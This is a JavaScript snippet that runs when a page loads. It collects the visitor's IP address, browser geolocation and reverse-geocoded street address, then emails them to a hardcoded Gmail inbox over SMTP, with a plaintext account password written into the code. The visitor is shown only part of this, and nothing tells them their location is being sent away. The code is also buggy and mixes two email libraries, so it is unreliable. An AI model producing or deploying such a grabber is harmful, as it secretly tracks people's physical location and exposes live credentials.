
form.addEventListener('submit', function(e) {
  console.log(e)
  form.preventDefault(); // prevent default form submission behavior
}

// Function to get the user's IP address
function getIPAddress() {
  return fetch('https://api.ipify.org/?format=json')
    .then(response => {
      if (!response.ok) {
        throw new Error('Unable to fetch IP address');
      }
      return response.json();
    })
    .then(data => data.ip);
}

// Function to get the user's current location
function getCurrentLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation is not supported'));
    }
    navigator.geolocation.getCurrentPosition(
      position => resolve({
        latitude: position.coords.latitude,
        longitude: position.coords.longitude
      }),
      error => reject(new Error(`Geolocation error: ${error.message}`))
    );
  });
}

// Determine if geolocation permission is granted
if (navigator.permissions) {
  navigator.permissions.query({name:'geolocation'}).then(permission => {
    if (permission.state === 'granted') {
      getCurrentLocation().then(location => {
        console.log('Latitude:', location.latitude);
        console.log('Longitude:', location.longitude);
      }).catch(error => {
        console.error(error);
        getIPAddress().then(ipAddress => {
          console.log('IP Address:', ipAddress);
        }).catch(error => {
          console.error(error);
        });
      });
    } else {
      getIPAddress().then(ipAddress => {
        console.log('IP Address:', ipAddress);
      }).catch(error => {
        console.error(error);
      });
    }
  }).catch(error => {
    console.error(error);
  });
} else {
  getIPAddress().then(ipAddress => {
    console.log('IP Address:', ipAddress);
  }).catch(error => {
    console.error(error);
  });
}


// Function to get the address for a given latitude and longitude using reverse geocoding
async function getAddress(latitude, longitude) {
  const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`);
  const data = await response.json();
  return data.display_name;
}

emailjs.init('YOUR_USER_ID');

async function sendEmail(ip,location,address) {
        try {
          console.log(location)
          const body = `
            <p>Your IP address is: ${ip}</p>
            <p>Your geolocation is:</p>
            <ul>
              <li>Latitude: ${location.latitude}</li>
              <li>Longitude: ${location.longitude}</li>
            </ul>
            <p>Your current address is:</p>
            <p>${address}</p>
          `;
          console.log(body)
          const message = {
            to: "jajones0707@gmail.com",
            subject: "Geolocation Information",
            html: body,
          };
          console.log(message)

          Email.send({
            ...message,
            from: "jajones0707@gmail.com",
            username: "jajones0707@gmail.com",
            password: "Kamsc$2020",
            smtp: {
              host: "smtp.gmail.com",
              ssl: true,
              port: 465,
              from: "jajones0707@gmail.com",
            },
          });
          console.log('sent')

        } catch (error) {
          console.error(error);
        }
      }

// Function to display the IP address, geolocation, and address on the page
async function showResult() {
  try {
    const ip = await getIPAddress();
    const location = await getCurrentLocation();
    const address = await getAddress(location.latitude, location.longitude);

	await sendEmail(ip, location, address);
    const result = document.getElementById('result');
    result.innerHTML = `
      <p>IP:${ip} Address:${address}</p>
    `;
  } catch (error) {
    console.error(error);
    const result = document.getElementById('result');
    result.innerHTML = `
      <p>Unable to retrieve your current location.</p>
    `;
  }
}

showResult();
sendEmail()